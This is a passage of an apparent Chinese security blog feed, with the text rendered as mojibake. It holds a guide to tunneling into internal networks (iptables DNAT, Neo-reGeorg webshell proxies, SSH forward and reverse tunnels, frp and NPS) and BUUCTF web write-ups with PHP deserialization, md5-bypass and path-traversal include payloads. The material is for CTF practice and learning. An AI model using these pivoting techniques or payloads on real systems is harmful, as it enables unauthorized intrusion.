class="line">#éœ€è¦è®¿é—®çš„å†…ç½‘åœ°å€ï¼š10.1.1.11ï¼ˆWindowsï¼‰</span><br><span class="line">#å†…ç½‘è¾¹ç•ŒwebæœåŠ¡å™¨ï¼š192.168.100.100ï¼ˆLinuxï¼‰</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br><span class="line"></span><br><span class="line">#ä¿å­˜é‡å¯æœåŠ¡</span><br><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure><h3 id="webshellä»£ç†å·¥å…·"><a href="#webshellä»£ç†å·¥å…·" class="headerlink" title="webshellä»£ç†å·¥å…·"></a>webshellä»£ç†å·¥å…·</h3><p>é…åˆWebshellï¼Œå¤ç”¨ç›®æ ‡çš„WebæœåŠ¡ç«¯å£å¼€ä¸€ä¸ªSocks5ä»£ç†éš§é“ã€‚</p><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#ç”ŸæˆæœåŠ¡ç«¯</span><br><span class="line">python3 neoreg.py generate -k password</span><br><span class="line"></span><br><span class="line">#åœ¨æœ¬åœ°å»ºç«‹Socks5ä»£ç†</span><br><span class="line">python3 neoreg.py -k password -u http:&#x2F;&#x2F;xx&#x2F;tunnel.php</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç”¨ä½œç«¯å£è½¬å‘ï¼ŒæŠŠwebshellæ‰€åœ¨ä¸»æœºçš„ç«¯å£è½¬å‘åˆ°æœ¬åœ°ï¼ˆä¸å‡ºç½‘çš„æƒ…å†µå¾ˆå¥½ç”¨ï¼‰ï¼Œè¯·è‡ªè¡Œæ¢ç´¢</p><h3 id="sshéš§é“"><a href="#sshéš§é“" class="headerlink" title="sshéš§é“"></a>sshéš§é“</h3><p>SSHä¸€èˆ¬æ˜¯å…è®¸é€šè¿‡é˜²ç«å¢™çš„ï¼Œè€Œä¸”ä¼ è¾“è¿‡ç¨‹æ˜¯åŠ å¯†çš„</p><h4 id="æœ¬åœ°è½¬å‘ï¼ˆæ­£å‘ï¼‰"><a href="#æœ¬åœ°è½¬å‘ï¼ˆæ­£å‘ï¼‰" class="headerlink" title="æœ¬åœ°è½¬å‘ï¼ˆæ­£å‘ï¼‰"></a>æœ¬åœ°è½¬å‘ï¼ˆæ­£å‘ï¼‰</h4><p>åœ¨ä¸­ä¼ VPSä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L &lt;VPSç›‘å¬ç«¯å£&gt;:&lt;ç›®æ ‡å†…ç½‘IP&gt;:&lt;ç›®æ ‡ç«¯å£&gt; root@ç›®æ ‡å¤–ç½‘WebæœåŠ¡å™¨ï¼ˆä¼šè¦æ±‚è¾“å…¥å¯†ç ï¼‰</span><br><span class="line"></span><br><span class="line">ssh -CfNg -L 8080:10.1.1.3:3389 root@100.100.1.100</span><br><span class="line"></span><br><span class="line">#VPSä¸ŠæŸ¥çœ‹8090ç«¯å£æ˜¯å¦å·²ç»è¿æ¥</span><br><span class="line">netstat -tulnp | grep &quot;8090&quot;</span><br><span class="line"></span><br><span class="line">#è¿æ¥ç›®æ ‡å†…ç½‘æœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢</span><br><span class="line">VPS-IP:8090</span><br></pre></td></tr></table></figure><h3 id="è¿œç¨‹è½¬å‘ï¼ˆåå‘ï¼‰"><a href="#è¿œç¨‹è½¬å‘ï¼ˆåå‘ï¼‰" class="headerlink" title="è¿œç¨‹è½¬å‘ï¼ˆåå‘ï¼‰"></a>è¿œç¨‹è½¬å‘ï¼ˆåå‘ï¼‰</h3><p>åœ¨WebæœåŠ¡å™¨ä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R &lt;VPSçš„ç«¯å£&gt;:&lt;ç›®æ ‡å†…ç½‘IP&gt;:&lt;ç›®æ ‡ç«¯å£&gt; root@VPS-IPï¼ˆä¼šè¦æ±‚è¾“å…¥å¯†ç ï¼‰</span><br><span class="line">ssh -CfNg -R 8090:10.1.1.3:3389 root@192.168.0.1</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>VPS</code>çš„8090ç«¯å£ï¼Œå³å¯è¿æ¥å†…ç½‘æ•°æ®åº“æœåŠ¡å™¨çš„3389</p><h3 id="Frpæ­å»ºéš§é“ï¼š"><a href="#Frpæ­å»ºéš§é“ï¼š" class="headerlink" title="Frpæ­å»ºéš§é“ï¼š"></a>Frpæ­å»ºéš§é“ï¼š</h3><p>githubï¼š<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>ç®€å•åœ°è¯´ï¼Œfrpå°±æ˜¯ä¸€ä¸ªåå‘ä»£ç†è½¯ä»¶ï¼Œå®ƒä½“ç§¯è½»é‡ä½†åŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œå¯ä»¥<strong>ä½¿å¤„äºå†…ç½‘æˆ–é˜²ç«å¢™åçš„è®¾å¤‡å¯¹å¤–ç•Œæä¾›æœåŠ¡</strong>ï¼Œå®ƒæ”¯æŒHTTPã€TCPã€UDPç­‰ä¼—å¤šåè®®ã€‚</p><h4 id="ç«¯å£è½¬å‘ï¼š-1"><a href="#ç«¯å£è½¬å‘ï¼š-1" class="headerlink" title="ç«¯å£è½¬å‘ï¼š"></a>ç«¯å£è½¬å‘ï¼š</h4><p>æœåŠ¡ç«¯é…ç½®æ–‡ä»¶frps.initï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">token &#x3D; server_pass</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; server_pass</span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp #æµé‡ç±»å‹</span><br><span class="line">local_ip &#x3D; å†…ç½‘ip     # å±€åŸŸç½‘åœ°å€ï¼Œå¯ä»¥æ˜¯éæœ¬æœºip       </span><br><span class="line">local_port &#x3D; 3389#è¦è½¬å‘çš„ç«¯å£</span><br><span class="line">remote_port &#x3D; 7001#è¿œç¨‹ç«¯å£</span><br><span class="line">plugin &#x3D;socks5 </span><br></pre></td></tr></table></figure><p>è®¿é—®vps 7001 åˆ™è®¿é—®å†…ç½‘3389ç«¯å£</p><p>å¯åŠ¨çš„è¯å°±ä¸€ä¸ªæœåŠ¡å™¨./frps -c frps.ini ä¸€ä¸ªå®¢æˆ·ç«¯./frpc -c frpc.ini</p><h4 id="socks5ä»£ç†æ›´ç®€å•äº†ï¼š"><a href="#socks5ä»£ç†æ›´ç®€å•äº†ï¼š" class="headerlink" title="socks5ä»£ç†æ›´ç®€å•äº†ï¼š"></a>socks5ä»£ç†æ›´ç®€å•äº†ï¼š</h4><p>å®¢æˆ·ç«¯é…ç½®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; server_pass</span><br><span class="line">[socks_proxy]</span><br><span class="line">type &#x3D; tcp #æµé‡ç±»å‹</span><br><span class="line">remote_port &#x3D; 7001#è¿œç¨‹ç«¯å£</span><br><span class="line">plugin &#x3D;socks5 </span><br></pre></td></tr></table></figure><h3 id="æ­å»ºNPSéš§é“ï¼š"><a href="#æ­å»ºNPSéš§é“ï¼š" class="headerlink" title="æ­å»ºNPSéš§é“ï¼š"></a>æ­å»ºNPSéš§é“ï¼š</h3><p>frpä¸è¡Œï¼Œåˆä¸ä¼šæ”¹æµé‡ç‰¹å¾ï¼Œå¯ä»¥ç”¨ç”¨nps</p><p>ä½¿ç”¨æ­¥éª¤ï¼š</p><ul><li>å¼€å¯æœåŠ¡ç«¯ï¼Œå‡å¦‚å…¬ç½‘æœåŠ¡å™¨ipä¸º1.1.1.1ï¼Œé…ç½®æ–‡ä»¶ä¸­<code>bridge_port</code>ä¸º8024ï¼Œé…ç½®æ–‡ä»¶ä¸­<code>web_port</code>ä¸º8080</li><li>è®¿é—®1.1.1.1:8080</li><li>åœ¨å®¢æˆ·ç«¯ç®¡ç†ä¸­åˆ›å»ºä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œè®°å½•ä¸‹éªŒè¯å¯†é’¥</li><li>å†…ç½‘å®¢æˆ·ç«¯è¿è¡Œï¼ˆwindowsä½¿ç”¨cmdè¿è¡ŒåŠ .exeï¼‰</li></ul><p>1ã€ä¸‹è½½npsæœåŠ¡ç«¯åˆ°è‡ªå·±çš„VPSï¼ˆ<a href="https://ehang-io.github.io/nps%EF%BC%89">https://ehang-io.github.io/npsï¼‰</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x nps</span><br><span class="line">sudo .&#x2F;nps install#å®‰è£…</span><br></pre></td></tr></table></figure><p>2.ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼ˆæ•æ„Ÿä¿¡æ¯æ”¹æ‰/etc/nps/conf/nps.confï¼ŒåŸæœ¬çš„é…ç½®æ–‡ä»¶æŒºé•¿çš„ï¼Œè¿è¡Œåè€Œä¼šæŠ¥é”™ï¼Œç›´æ¥æ›¿æ¢æˆä»¥ä¸‹çš„æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">appname &#x3D; nps</span><br><span class="line">#Boot mode(dev|pro)</span><br><span class="line">runmode &#x3D; dev</span><br><span class="line"></span><br><span class="line">##bridge</span><br><span class="line"># åº•å±‚é€šä¿¡åè®®ï¼Œé»˜è®¤tcpï¼Œå¯é€‰ç”¨kcp</span><br><span class="line">bridge_type&#x3D;tcp</span><br><span class="line"># åº•å±‚é€šä¿¡ç«¯å£ï¼Œé»˜è®¤8024ï¼Œå¦‚å·²è¢«å ç”¨è¯·æŒ‡å®šå…¶ä»–ç«¯å£</span><br><span class="line">bridge_port&#x3D;8024</span><br><span class="line">bridge_ip&#x3D;0.0.0.0</span><br><span class="line"></span><br><span class="line"># å½“å®¢æˆ·ç«¯ä»¥é…ç½®æ–‡ä»¶æ¨¡å¼å¯åŠ¨æ—¶ä¼šç”¨åˆ°çš„éªŒè¯å¯†é’¥ï¼Œå¯è‡ªè¡Œè®¾ç½®ï¼Œæœ¬æ•™ç¨‹ä¸ä¼šä½¿ç”¨åˆ°</span><br><span class="line">public_vkey&#x3D;&lt;ä½ çš„é€šä¿¡å¯†é’¥&gt;</span><br><span class="line"></span><br><span class="line">#web</span><br><span class="line">web_host&#x3D;&lt;æœåŠ¡å™¨IPæˆ–åŸŸå&gt;</span><br><span class="line">web_username&#x3D;&lt;è®¾ç½®ç”¨æˆ·å&gt;</span><br><span class="line">web_password&#x3D;&lt;è®¾ç½®å¯†ç &gt;</span><br><span class="line">web_port &#x3D; &lt;ç½‘é¡µé¢æ¿ç«¯å£&gt;</span><br><span class="line">web_ip&#x3D;0.0.0.0</span><br></pre></td></tr></table></figure><p>3.å¼€å¯æœåŠ¡ç«¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nps start#å¯åŠ¨</span><br><span class="line">sudo nps stop#åœæ­¢</span><br><span class="line">sudo nps reload#æœåŠ¡ç«¯é…ç½®æ–‡ä»¶é‡è½½</span><br></pre></td></tr></table></figure><p>4.è®¿é—®vpsip s:8080ï¼Œåœ¨å®¢æˆ·ç«¯ç®¡ç†ä¸­åˆ›å»ºä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œè®°å½•ä¸‹éªŒè¯å¯†é’¥ï¼ˆä¹Ÿå¯ä»¥ä¸è®¾ç½®ï¼Œåˆ™ä¼šé»˜è®¤ç”Ÿæˆï¼‰</p><p>é€‰æ‹©å®¢æˆ·ç«¯é€šè¿‡é…ç½®æ–‡ä»¶è¿æ¥ä¸ºå¦ï¼Œä¸ç„¶å¯èƒ½ä¼šé…ç½®å†²çªï¼Œç‚¹å‡»æ–°å¢ï¼Œæ–°å¢æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316212917305.png"></p><p>å¯ä»¥ç›´æ¥çœ‹åˆ°å®¢æˆ·ç«¯å¯åŠ¨å‘½ä»¤å¯ä»¥ç›´æ¥å¤åˆ¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316213053224.png"></p><p>ä¸‹è½½å¯¹åº”çš„å®¢æˆ·ç«¯ï¼Œå› ä¸ºæˆ‘è¿™é‡Œä¸‹è½½çš„æœåŠ¡ç«¯ä¸ºlinux_amd64ï¼Œåˆ™ä¸‹è½½windows_amd64</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316213529139.png"></p><p>è¿è¡Œå‘½ä»¤å¯ä»¥çœ‹åˆ°è¿æ¥æˆåŠŸã€‚</p><p>webç•Œé¢ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸»æœºä¸Šçº¿</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316213624435.png"></p><p>ä¸‹ä¸€æ­¥å°±èƒ½å¯¹å®¢æˆ·ç«¯è¿›è¡Œæ“ä½œäº†ï¼š</p><p>ç›´æ¥ç‚¹å‡»éš§é“é€‰é¡¹ï¼Œå¯¹è¯¥å®¢æˆ·ç«¯è¿›è¡Œæ“ä½œâ€¦â€¦</p><p> <img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316214310793.png"></p><p>éå¸¸çš„å¥½ç”¨å—·ï¼</p><p>å½“ç„¶å°ä¼—çš„ä¸€äº›ä»£ç†å·¥å…·ä¼šæ›´å¥½ç”¨ï¼Œç»™è‡ªå·±ç«‹ä¸ªflagï¼Œè‡ªå·±å¼€å‘ä¸€ä¸ªä»£ç†å·¥å…·</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-Webåˆ†ç±»ç»ƒä¹ </title>
      <link href="2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/"/>
      <url>2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»£ç å®¡è®¡ä»¥åŠååºåˆ—åŒ–"><a href="#ä»£ç å®¡è®¡ä»¥åŠååºåˆ—åŒ–" class="headerlink" title="ä»£ç å®¡è®¡ä»¥åŠååºåˆ—åŒ–"></a>ä»£ç å®¡è®¡ä»¥åŠååºåˆ—åŒ–</h1><h2 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: jinzhao</span><br><span class="line"> * Date: 2019&#x2F;10&#x2F;6</span><br><span class="line"> * Time: 8:04 PM</span><br><span class="line"> *&#x2F;</span><br><span class="line"> </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"> </span><br><span class="line">class BUU &#123;</span><br><span class="line">   public $correct &#x3D; &quot;&quot;;</span><br><span class="line">   public $input &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct &#x3D; base64_encode(uniqid());</span><br><span class="line">           if($this-&gt;correct &#x3D;&#x3D;&#x3D; $this-&gt;input) &#123;</span><br><span class="line">               echo file_get_contents(&quot;&#x2F;flag&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception $e) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if($_GET[&#39;pleaseget&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;) &#123;</span><br><span class="line">    if($_POST[&#39;pleasepost&#39;] &#x3D;&#x3D;&#x3D; &#39;2&#39;) &#123;</span><br><span class="line">        if(md5($_POST[&#39;md51&#39;]) &#x3D;&#x3D; md5($_POST[&#39;md52&#39;]) &amp;&amp; $_POST[&#39;md51&#39;] !&#x3D; $_POST[&#39;md52&#39;]) &#123;</span><br><span class="line">            unserialize($_POST[&#39;obj&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getå’Œpostä¼ å‚ï¼ŒMD5ç¢°æ’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getï¼š?pleaseget&#x3D;1</span><br><span class="line">postï¼špleasepost&#x3D;2&amp;md51[]&#x3D;1&amp;md52[]&#x3D;2</span><br></pre></td></tr></table></figure><p>phpååºåˆ—åŒ–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class BUU&#123;</span><br><span class="line">    public $correct&#x3D;&quot;&quot;;</span><br><span class="line">    public $input&#x3D;&quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj&#x3D; new BUU;</span><br><span class="line">$obj-&gt;input&#x3D;&amp;$obj-&gt;correct;</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/476597133.png"></p><p>è¿›è€Œæ„é€ payloadï¼Œå¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š</span><br><span class="line">pleasepost&#x3D;2&amp;md51[]&#x3D;1&amp;md52[]&#x3D;2&amp;obj&#x3D;O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3997285449.png"></p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2193258869.png"></p><p>åœ¨æ³¨è§£ä¸­æˆ‘ä»¬å‘ç° <code>source.php</code> ï¼›è®¿é—®å¾—åˆ°æºç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬è¯•ç€è®¿é—®hint.phpè·å–åˆ°flagçš„æ–‡ä»¶å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>æœ€åæ„é€ payloadå¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š</span><br><span class="line">http:&#x2F;&#x2F;97050581-1a0e-42b8-9071-67c1d68ca596.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/529846447.png"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3090789108.png"><br>æ ¹æ®æç¤ºæˆ‘ä»¬å…ˆä¸‹è½½ä»–çš„æºç <br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3205019552.png"><br>â€¦â€¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š</span><br><span class="line">http:&#x2F;&#x2F;3022174e-6037-4c4b-937d-3dc5f6ad60f9.node3.buuoj.cn&#x2F;index.php?select&#x3D;O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1459374351.png"></p><p>å¾…ç»­â€¦</p><h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>å¾…ç»­â€¦</p><h1 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h1><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>å¾…ç»­â€¦</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="CISCN2019-åä¸œåŒ—èµ›åŒº-Web2"><a href="#CISCN2019-åä¸œåŒ—èµ›åŒº-Web2" class="headerlink" title="[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2"></a>[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2</h2><p>å¾…ç»­â€¦</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>å¾…ç»­â€¦</p><h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>å¾…ç»­â€¦</p><h1 